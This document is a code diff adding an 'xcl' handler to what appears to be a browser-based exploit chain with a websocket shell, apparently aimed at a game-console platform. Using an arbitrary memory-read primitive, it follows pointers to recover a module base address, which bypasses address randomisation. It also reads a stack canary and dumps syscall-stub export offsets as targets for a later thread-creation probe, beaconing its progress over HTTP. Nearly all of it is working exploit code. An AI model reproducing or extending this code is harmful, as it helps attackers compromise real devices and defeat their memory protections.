@@ -5602,6 +5602,58 @@ function _startWsShell(){
         break;
       }
 
+      case 'xcl':{
+        /* THE EXPORT CLUSTER DUMP: the export table (lk+0x48000,
+         * 0x82C entries) covers the game lane's 52-stub thread-
+         * syscall cluster (0x13000-0x16000). Read entries
+         * [msg.from, msg.to) and return {idx, text} pairs - the
+         * exact offsets of the cluster stubs = the tw lottery
+         * targets. thr_new sits near the END of the stub region
+         * (13.60 order: sorted position 291/331) -> the highest
+         * text RVAs are the prime candidates. */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function XC(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('XCL-'+s),false);x.send();}catch(e){}}
+        try{
+          var ent=S.absRead(0x10001c8000n,0x100);
+          var trPtr=0n;
+          for(var ei=0;ei<ent.length;ei++){if(ent[ei]>=0x10001f0000n&&ent[ei]<0x1000200000n){trPtr=ent[ei];break;}}
+          if(trPtr===0n){reply.err='no thread-record ptr';break;}
+          var tr=S.absRead(trPtr,0x60);
+          var ptp=0n;
+          for(var ti2=0;ti2<tr.length;ti2++){if(tr[ti2]>=0x880000000n&&tr[ti2]<0x900000000n){ptp=tr[ti2];break;}}
+          if(ptp===0n){reply.err='no pthread ptr';break;}
+          var node=ptp,Q=0n;
+          for(var hop=0;hop<5;hop++){
+            var p=S.absRead(node,0x60);
+            Q=p[8];
+            if((Q&0x3fffn)===0x218n&&Q>0x800000000n)break;
+            node=Q-0x38n;
+          }
+          if((Q&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var B=Q-0x6C218n;
+          if(B%0x4000n!==0n){reply.err='base unaligned';break;}
+          var can=S.absRead(B+0x751D0n,8)[0];
+          XC('1 B=0x'+B.toString(16)+' canary=0x'+can.toString(16));
+          if(!(can>0x1000000n)){reply.err='canary fail';break;}
+          reply.base='0x'+B.toString(16);
+          /* read the export entries [from, to) */
+          var tbl=B+0x48000n;
+          var from=parseInt(msg.from)||300;
+          var to=parseInt(msg.to)||500;
+          var entries=[];
+          for(var idx2=from;idx2<to;idx2++){
+            var e1=S.absRead(tbl+BigInt(0xC+idx2*8),8)[0];
+            var aF=Number(e1>>32n);
+            var sR=Number(e1&0xFFFFFFFFn);
+            var txt=0x48000+Number(BigInt.asIntN(32,BigInt(sR)));
+            entries.push({idx:idx2,text:'0x'+txt.toString(16)});
+          }
+          reply.entries=entries;
+          XC('2 entries n='+entries.length);
+        }catch(e2){reply.err='xcl fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
       case 'tw':{
         /* THE THREAD WITNESS (the game lane's 56l probe ported): the
          * thr_new candidate (export entry #msg.idx) called with a FULLY
